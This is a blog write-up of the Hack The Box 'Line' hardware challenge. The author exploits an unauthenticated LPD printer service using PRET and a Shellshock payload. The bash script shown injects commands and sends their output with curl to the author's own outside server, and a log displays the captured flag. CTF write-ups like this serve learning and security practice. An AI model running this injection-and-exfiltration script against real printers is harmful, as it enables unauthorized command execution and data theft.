---
layout: newpost
title: "Writeup: HTB Challenge Line"
date: 2025-01-26
categories: [tech]
tags: [htb, ctf, hardware]
---

- Challenge: [Line](https://app.hackthebox.com/challenges/Line)
- Category: Hardware
- Solve date: 26 Jan 2025

---

### Description
> During an architectural review of printers on our network, we found an LPD protocol implementation running on a network printer. Can you help in auditing this service?

### Provided files
- n/a

---
# What is "LPD"?

> The **Line Printer Daemon protocol/Line Printer Remote protocol** (or **LPD**, **LPR**) is a network [printing protocol](https://en.wikipedia.org/wiki/Printing_protocol "Printing protocol") for submitting print jobs to a remote printer.

---

# Finding the exploit

Searching for "lpd github exploit" leads us to [PRET](https://github.com/RUB-NDS/PRET) which contains some interesting scripts for us to use. Since LPD is normally don't have any authentication we can just go ahead and exploit. In the help page they mention CVE-2014-6271, a.k.a. [shellshock](https://www.cisa.gov/news-events/alerts/2014/09/25/gnu-bourne-again-shell-bash-shellshock-vulnerability-cve-2014-6271):

`lpdtest.py --port $port $ip in '() {:;}; COMMAND'`

---

## Exploit code

After messing around with the command I ended up with first writing all output to a file in `/tmp` and then sending a POST request to my [own web server]({{site.baseurl}}/blog/tech/flask-c2/):

```py
#!/bin/bash
cmd=$1
host="83.136.250.116:44892"
ip=$(echo $host | cut -d':' -f1)
port=$(echo $host | cut -d':' -f2)
echo "IP: $ip"
echo "PORT: $port"
echo "CMD: $cmd"
echo ""

if [ "$2" == "simple" ]; then
	python3 /home/thorn/git/PRET/lpd/lpdtest.py --port $port $ip in '() {:;};'"$cmd"' | xargs curl htb.thoren.life:13337/test -H "Content-Type: text/plain" -d $1'
else
	echo "Writing output to /tmp/out.txt and sending it to the server.."
	python3 /home/thorn/git/PRET/lpd/lpdtest.py --port $port $ip in '() {:;};'"$cmd"' > /tmp/out.txt 2>&1'
	python3 /home/thorn/git/PRET/lpd/lpdtest.py --port $port $ip in '() {:;};curl htb.thoren.life:13337/test -H "Content-Type: text/plain" --data "@/tmp/out.txt" '
fi
```

## Getting the flag

1. `./go.sh "find / -name flag.txt"`
2. Flask logs shows us the `flag.txt` is in the `/opt` directory
3. `./go.sh "cat /opt/flag.txt"`

Flask log:
```sh
2025-01-26 17:32:41,112 - INFO - [+] Payload:
HTB{l00t..}
2025-01-26 17:32:41,112 - INFO - 83.136.250.116 - - [26/Jan/2025 17:32:41] "POST /test HTTP/1.1" 200 -
```